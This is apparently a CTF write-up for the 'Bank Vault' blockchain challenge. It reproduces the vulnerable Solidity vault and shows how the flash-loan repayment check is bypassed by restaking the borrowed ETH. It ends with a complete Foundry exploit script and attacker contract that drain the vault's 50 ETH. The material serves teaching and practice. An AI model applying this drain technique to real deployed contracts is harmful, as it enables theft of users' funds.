+++
date = '2024-12-30T10:59:08+05:30'
draft = true
title = 'Bank Vault'
categories=["Blockchain"]
series="War-Games-CTF"
tags=["Flash Loans"]
+++

# Writeup for Bank Vault

- Before diving into this writeup, it’s crucial to have a solid understanding of Foundry, a powerful framework for Ethereum smart contract development. Foundry will be your primary tool for writing, testing, and breaking contracts in this guide.

### Challenge Description

Bank Vaults is a liquid staking protocol where users can store funds and earn yeild in the form of yeild tokens. The owners has assured me it is secured and no rug pull can occur and users funds are locked in. Can you prove them wrong?

**Author:** MaanVad3r

### The Challenge and Exploit

The below are source contracts

1. **Setup** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BankVaults.sol";
import {MockERC20} from "./MockERC20.sol";
contract Setup {
    BankVaults public challengeInstance;

    constructor() payable {
        require(msg.value == 50 ether, "Setup requires exactly 50 ETH to initialize the challenge");

        
        MockERC20 mockERC20 = new MockERC20(1_000_000 ether);

        // Step 2: Deploy the BankVaults contract with the MockERC20 address
        challengeInstance = new BankVaults{value: 50 ether}(IERC20(address(mockERC20)));
    }

    function isSolved() public view returns (bool) {
        // The challenge is solved if the ETH balance of the BankVaults contract is 0
        return address(challengeInstance).balance == 0;
    }
}
```

2. **MOCKERC20** contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface IToken {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract MockERC20 is IToken {
    uint256 public totalSupply;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    constructor(uint256 _initialAmount) {
        balances[msg.sender] = _initialAmount;
        totalSupply = _initialAmount;
    }

    function balanceOf(address _owner) public view override returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public override returns (bool) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        require(allowed[_from][msg.sender] >= _value);
        require(balances[_from] >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        return true;
    }

    function approve(address _spender, uint256 _value) public override returns (bool) {
        allowed[msg.sender][_spender] = _value;
        return true;
    }
}
```

3. **BankVault** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address allowanceOwner, address spender) external view returns (uint256);
}

interface IERC4626 {
    function withdraw(uint256 assets, address receiver, address withdrawOwner) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address redeemOwner) external returns (uint256 assets);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function maxDeposit(address receiver) external view returns (uint256);
    function maxMint(address receiver) external view returns (uint256);
    function maxWithdraw(address withdrawOwner) external view returns (uint256);
    function maxRedeem(address redeemOwner) external view returns (uint256);
}

interface IFlashLoanReceiver {
    function executeFlashLoan(uint256 amount) external;
}

contract BankVaults is IERC4626 {
    IERC20 public immutable asset;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public stakeTimestamps;
    mapping(address => bool) public isStaker;
    address public contractOwner;
    uint256 public constant MINIMUM_STAKE_TIME = 2 * 365 days;

    string public name = "BankVaultToken";
    string public symbol = "BVT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public vaultTokenBalances;
    mapping(address => mapping(address => uint256)) public allowances;

    modifier onlyStaker() {
        require(isStaker[msg.sender], "Caller is not a staker");
        _;
    }

    constructor(IERC20 _asset) payable {
        asset = _asset;
        contractOwner = msg.sender;

        
        uint256 initialSupply = 10_000_000 ether; 
        vaultTokenBalances[contractOwner] = initialSupply;
        totalSupply = initialSupply;
    }

    // Native ETH staking
    function stake(address receiver) public payable returns (uint256 shares) {
        require(msg.value > 0, "Must deposit more than 0"); 

        shares = convertToShares(msg.value); 
        balances[receiver] += msg.value; 
        stakeTimestamps[receiver] = block.timestamp; 

        vaultTokenBalances[receiver] += shares; 
        totalSupply += shares; 

        isStaker[receiver] = true; 

        return shares;
    }

    function withdraw(uint256 assets, address receiver, address owner) public override onlyStaker returns (uint256 shares) {
        
        require(vaultTokenBalances[owner] >= assets, "Insufficient vault token balance");
        uint256 yield = (assets * 1) / 100;
        uint256 totalReturn = assets + yield;
        require(address(this).balance >= assets, "Insufficient contract balance");
        
        
        shares = convertToShares(assets);
        vaultTokenBalances[owner] -= assets;
        totalSupply -= assets;
        balances[owner] -= assets;
        isStaker[receiver] = false;

        
        payable(receiver).transfer(assets);

        return shares;
    }

    function calculateYield(uint256 assets, uint256 duration) public pure returns (uint256) {
        if (duration >= 365 days) {
            return (assets * 5) / 100; 
        } else if (duration >= 180 days) {
            return (assets * 3) / 100; 
        } else {
            return (assets * 1) / 100; 
        }
    }


    function flashLoan(uint256 amount, address receiver, uint256 timelock) public {
        require(amount > 0, "Amount must be greater than 0");
        require(balances[msg.sender] > 0, "No stake found for the user");

        unchecked {
            require(timelock >= stakeTimestamps[msg.sender] + MINIMUM_STAKE_TIME, "Minimum stake time not reached");
        }

        require(address(this).balance >= amount, "Insufficient ETH for flash loan");

        uint256 balanceBefore = address(this).balance;

        (bool sent, ) = receiver.call{value: amount}("");
        require(sent, "ETH transfer failed");

        IFlashLoanReceiver(receiver).executeFlashLoan(amount);

        uint256 balanceAfter = address(this).balance;

        require(balanceAfter >= balanceBefore, "Flash loan wasn't fully repaid in ETH");
    }


    function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {
        require(shares > 0, "Must redeem more than 0");
        require(vaultTokenBalances[owner] >= shares, "Insufficient vault token balance");
        require(block.timestamp >= stakeTimestamps[owner] + MINIMUM_STAKE_TIME, "Minimum stake time not reached");

        assets = convertToAssets(shares);

        vaultTokenBalances[owner] -= shares;
        totalSupply -= shares;
        balances[owner] -= assets;

        require(asset.transfer(receiver, assets), "Redemption failed");
        return assets;
    }

    function rebalanceVault(uint256 threshold) public returns (bool) {
        require(threshold > 0, "Threshold must be greater than 0");
        uint256 assetsInVault = asset.balanceOf(address(this));
        uint256 sharesToBurn = convertToShares(assetsInVault / 2);
        totalSupply -= sharesToBurn; 
        return true; 
    }

    function dynamicConvert(uint256 assets, uint256 multiplier) public pure returns (uint256) {
        return (assets * multiplier) / 10;
    }

    function convertToShares(uint256 assets) public view override returns (uint256) {
        return assets;
    }

    function convertToAssets(uint256 shares) public view override returns (uint256) {
        return shares;
    }

    function totalAssets() public view override returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function maxDeposit(address) public view override returns (uint256) {
        return type(uint256).max;
    }

    function maxMint(address) public view override returns (uint256) {
        return type(uint256).max;
    }

    function maxWithdraw(address withdrawOwner) public view override returns (uint256) {
        return vaultTokenBalances[withdrawOwner];
    }

    function maxRedeem(address redeemOwner) public view override returns (uint256) {
        return vaultTokenBalances[redeemOwner];
    }

    receive() external payable {}
}

```

Our task is to make the `Setup:isSolved` function return true. This function will return true when the balance of the `BankVaults` contract becomes zero. The `BankVaults` contract is initialized with 50 ether during deployment. To solve this challenge, we need to drain and steal the 50 ether from `BankVaults` contract.

```solidity
function stake(address receiver) public payable returns (uint256 shares) {
    require(msg.value > 0, "Must deposit more than 0"); 

    shares = convertToShares(msg.value); 
    balances[receiver] += msg.value; 
    stakeTimestamps[receiver] = block.timestamp; 

    vaultTokenBalances[receiver] += shares; 
    totalSupply += shares; 

    isStaker[receiver] = true; 

    return shares;
}
```

The `stake()` function takes an argument of type `address` (receiver) as input and increases the receiver's balance by the amount of `msg.value` (ETH sent during the call). When someone stakes native ETH, the contract gives vault `tokens` to the receiver. The number of vault token shares is determined by the `BankVaults:convertToShares` function. However, there is no logic implemented in the `BankVaults:convertToShares` function—it simply returns the amount passed to it.


```solidity
function withdraw(uint256 assets, address receiver, address owner) public override onlyStaker returns (uint256 shares) { 
    require(vaultTokenBalances[owner] >= assets, "Insufficient vault token balance");
    uint256 yield = (assets * 1) / 100;
    uint256 totalReturn = assets + yield;
    require(address(this).balance >= assets, "Insufficient contract balance");  
    shares = convertToShares(assets);
    vaultTokenBalances[owner] -= assets;
    totalSupply -= assets;
    balances[owner] -= assets;
    isStaker[receiver] = false;  
    payable(receiver).transfer(assets);
    return shares;
    }
```

The `withdraw()` function takes three arguments: a `uint256` (`assets`), an `address` (`receiver`), and an `address` (`owner`). The function transfers the staked ETH from the owner to the receiver and reduces the owner's vault token balance. If the owner does not have enough balance, the function will revert.

Additionally, there is no risk of re-entrancy in this function, as it follows the Check-Effect-Interaction (CEI) pattern. This pattern ensures that state changes (like reducing balances) are made before any external calls (such as transferring ETH). Since re-entrancy is not a concern, we should check for other possible ways to drain the contract balance.


```solidity
function flashLoan(uint256 amount, address receiver, uint256 timelock) public {
    require(amount > 0, "Amount must be greater than 0");
    require(balances[msg.sender] > 0, "No stake found for the user");

    unchecked {
        require(timelock >= stakeTimestamps[msg.sender] + MINIMUM_STAKE_TIME, "Minimum stake time not reached");
    }

    require(address(this).balance >= amount, "Insufficient ETH for flash loan");

    uint256 balanceBefore = address(this).balance;

    (bool sent, ) = receiver.call{value: amount}("");
    require(sent, "ETH transfer failed");

    IFlashLoanReceiver(receiver).executeFlashLoan(amount);

    uint256 balanceAfter = address(this).balance;

    require(balanceAfter >= balanceBefore, "Flash loan wasn't fully repaid in ETH");
}
```

The `flashLoan()` function takes three arguments as input: a `uint256` (`amount`), an `address` (`receiver`), and a `uint256` (`timelock`). The function grants a flash loan to the receiver. The receiver must be a contract because, after transferring the ether, the function calls `executeFlashLoan()` on the receiver, and the receiver must repay the loan amount within the same transaction. The `flashLoan()` function can only be called by users who have staked ETH in the contract.

A key feature of this function is that it checks whether the loan has been repaid by comparing the contract's balance before and after the loan transfer. If the balance has decreased (indicating that the loan wasn't fully repaid), the function will revert.

The function expects the loan repayment to be verified by comparing the contract's balance before and after the loan transfer. It uses a low-level call to send the loan amount, and the loan is expected to be repaid within the same transaction. However, if the `stake()` function is called instead of the low-level call, there will be no change in the balance (as the staked ether remains in the contract). As a result, the flashLoan() function will execute successfully, but the contract's balance will be updated to include the loan amount, bypassing the loan repayment check.

Since the loan receiver contract holds the balance after the flash loan transfer, it is possible to directly withdraw the stake of the loan receiver. 

Now It's time to exploit the contract. The below is the exploit script.

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Setup,MockERC20,BankVaults} from "../../../src/WarGames_CTF/BankVault/Setup.sol";
import {Script,console} from "forge-std/Script.sol";


contract Exploit is Script{
    function run()public{
        
        vm.startBroadcast();
        address _setup=address(/* YOUR_SETUP_ADDRESS*/);
        Setup setup=Setup(_setup);
        BankVaults bank=setup.challengeInstance();
        ExploitBankVault exploit=new ExploitBankVault(bank);
        bank.stake{value:1}(msg.sender);
        bank.flashLoan(50 ether,address(exploit),block.timestamp+ 3* 365 days);
        bank.withdraw(50 ether,msg.sender,address(exploit));
        bank.stake{value:1}(msg.sender);
        bank.withdraw(2,msg.sender,msg.sender);
        vm.stopBroadcast();
    }
}

contract ExploitBankVault{
    BankVaults bank;

    constructor(BankVaults _bank){
        bank=_bank;
    }


    function executeFlashLoan(uint256 amount) external{
        bank.stake{value:50 ether}(address(this));
    }

    receive() external payable{}
}
```


<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>